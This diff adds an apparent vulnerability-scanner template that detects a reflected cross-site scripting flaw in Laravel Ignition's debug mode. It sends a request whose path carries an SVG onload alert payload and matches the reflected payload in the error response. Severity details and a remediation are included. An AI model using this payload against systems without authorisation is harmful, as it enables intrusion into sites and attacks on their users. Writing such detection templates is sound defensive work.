@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'Undefined index: --><svg onload=alert(document.domain)> in file'
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>'
+id: laravel-ignition-xss
+info:
+    author: 0x_Akoko
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+        cvss-score: 7.2
+        cwe-id: CWE-79
+    description: |
+        Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled.
+    metadata:
+        max-request: 1
+    name: Laravel Ignition - Cross-Site Scripting
+    reference:
+        - https://www.acunetix.com/vulnerabilities/web/laravel-ignition-reflected-cross-site-scripting/
+        - https://github.com/facade/ignition/issues/273
+    remediation: |
+        Disable debug mode by setting APP_DEBUG to false.
+    severity: high
+    tags:
+        - laravel
+        - ignition
